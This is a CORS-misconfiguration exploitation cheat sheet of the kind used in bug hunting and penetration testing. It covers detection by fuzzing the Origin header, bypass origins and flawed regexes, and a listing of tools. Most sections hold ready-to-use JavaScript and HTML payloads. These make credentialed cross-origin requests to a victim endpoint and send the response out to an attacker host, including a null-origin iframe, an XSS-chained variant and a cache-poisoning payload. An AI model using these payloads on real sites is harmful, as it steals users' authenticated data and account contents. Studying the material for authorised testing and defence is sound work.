# Cross-Origin Resource Sharing Misconfiguration 

## Where to find:

- API endpoint

## How to find:

- Send requests with different "Origin" values, such as the attacker's domain, the origin domain name or "null"

- If 'Origin' relect in the respone -> CORS is vulnerable

```
GET /endpoint HTTP/1.1
Host: victim.com
Origin: attacker.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://attacker.com
```

- Fuzzing the "Origin" header in the request -> inspect the server response -> identify which type of controlls are implemented
    -- Any domain
    ``` Origin: attacker.com ```
    -- Different DNS zone:
    ``` Origin: victim.net ```
    -- Any subdomain:
    ``` Origin: sub.victim.com ```
    -- Pad domain from the left:
    ``` Origin: attacker_victim.com ```
    -- Pad domain from the right:
    ``` Origin: victim.com.attacker.com ```

## 1. Exploting with credentials


Access-Control-Allow-Origin | Access-Control-Allow-Credentials | Exploitable
--------------------------- | -------------------------------- | -----------
http://attacker.com | true | Yes
null | true | Yes
\* | true | **No**

### Sever-generated Access-Control-Allow-Origin header from client-specified Origin header

- Vulnerable request:

```
GET /endpoint HTTP/1.1
Host: victim.com
Origin: attacker.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://attacker.com
Acesss-Control-Allow-Credentials: true

{"API_response"}
```
- Exploit: host a malicious JavaScript code on http://attacker.com/cors.html and send this link to victim

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://victim.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='http//atttacker.com/log?key='+this.responseText; 
};
```

or

```html
<html>
     <body>
         <h2>CORS PoC</h2>
         <div id="demo">
             <button type="button" onclick="cors()">Exploit</button>
         </div>
         <script>
             function cors() {
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
                 if (this.readyState == 4 && this.status == 200) {
                 document.getElementById("demo").innerHTML = alert(this.responseText);
                 }
             };
              xhr.open("GET", "http://victim.com/endpoint", true);
             xhr.withCredentials = true;
             xhr.send();
             }
         </script>
     </body>
</html>
```
 
### Null Origin
 
- Vulnerable request:

```
GET /endpoint HTTP/1.1
Host: victim.com
Origin: null

HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Acesss-Control-Allow-Credentials: true

{"API_response"}
```

- Exploit:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://victim.com/endpoint',true);
  req.withCredentials = true;
  req.send();

  function reqListener() {
    location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);
   };
</script>"></iframe> 
```

### XSS on Trusted Origin

- If the application does implement a strict whitelist of allowed origins, find a XSS on a trusted origin and replace the XSS payload with the CORS payload above: 

```
http://trusted.com/?xss=<script>CORS-ATTACK-PAYLOAD</script>
```

- Host a malicious code JavaScript on http://attacker.com/cors.html and send this link to victim

```html
<script>
	document.location="http://sub.victim.com/?xss=<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','http://victim.com/endpoint',true); req.withCredentials = true;req.send();function reqListener() {location='http://attacker.com/?log='%2bthis.responseText; };%3c/script>&anotherParam=1"
</script>
```

## 2. Exploting without credentials

### Access internal server

- If the server responds with a wildcard origin ```*```, the browser does never send the cookies.

- However, if the server does not require authentication, attacker can exploit the victim's browser as a proxy to access internal server.

- Vunlnerable request:

```
GET /endpoint HTTP/1.1
Host: internal.victim.com
Origin: null

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *

{"API_response"}
```

- Exploit:

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://internal.victim.com/endpoint',true); 
req.send();

function reqListener() {
    location='//atttacker.com/log?key='+this.responseText; 
};
```

### Client-side cache poisoning

- An application reflects the content of the ```X-User``` custom hedaer in response without doing any input validation and ```Vary: Origin``` headaer is missing.

- Because "Vary: Origin" header is missing, the victim's browser may store the response in the cache and then display it directly when the browser navigates to the associated URL. 

- Without CORS, this flaw is impossible to exploit since there's no way to make victim's browser send custom header cross-domain but with CORS enabled it is possible to use the ```XMLHtppReqeuest``` to do it.

- Vulnerable request:

```
GET /endpoint HTTP/1.1
Host: victim.com
Origin: http://attacker.com
X-User: <svg/onload=alert(1)>

HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://attacker.com
...

Invalid user: <svg/onload=alert(1)>
```
-Exploit: host a malicious JavaScript code on http://attacker.com/cors.html and send this link to victim

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://victim.com/endpoint',true); 
req.setRequestHeader('X-User', '<svg/onload=alert(1)');
req.send();

function reqListener() {
    location='//atttacker.com/endpoint'; 
};
```
## 3. Evasion techinques

### Using a target as subdomain

- If the target application only checks if the string "victim.com" is presented inside the "Origin" header, it is possible to create a subdomain on a controlled domain

``` Origin: http://victim.com.attacker.com ```

### Registering a domain ending with the same name

- Vulnerable regex:

``` ^https?:\/\/.*\.?victim\.com$ ```

- Bypass: attacker can use any orign that ends with the target domain:

``` Origin: http://attacker-sitevictim.com ```

### Controlling a subdomain of the target

- Vulnerable regex: allow cross-domain from "victim.com" and any subdomain

``` ^https?:\/\/(.*\.)?victim\.com$ ```

- Bypass: subdomain takeover or use a XSS on a subdomain to delivery CORS payload.

### Third party domains

- Sometime third-party domains have to allowed to make requests. 

- Eg: if the target application uses Amazon services, it may be possible that S3 buckets are allow to make requests.

- Attacker can host a malicious JavaScript code on a controlled S3 bucket and send this link to victim.

### Using spectial character

- Insert special characters into ```Origin``` header

```
,&'";!$^*()+=`~-_=|{}%

// non printable chars
%01-08,%0b,%0c,%0e,%0f,%10-%1f,%7f
```

- Vulnerable request:

```
GET /endpoint HTTP/1.1
Host: victim.com
Origin: http://victim.com}.attacker.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://vivtim.com{.attacker.com

```

- Detailed exploit:
    - https://www.corben.io/advanced-cors-techniques
    - https://infosecwriteups.com/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397
    
## 4. Tools

- https://github.com/s0md3v/Corsy
- https://github.com/chenjj/CORScanner
- https://github.com/lc/theftfuzzer
- https://github.com/Shivangx01b/CorsMe

## References

- https://www.bedefended.com/papers/cors-security-guide
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration
- https://github.com/hackerscrolls/SecurityTips/tree/master/Web/CORS

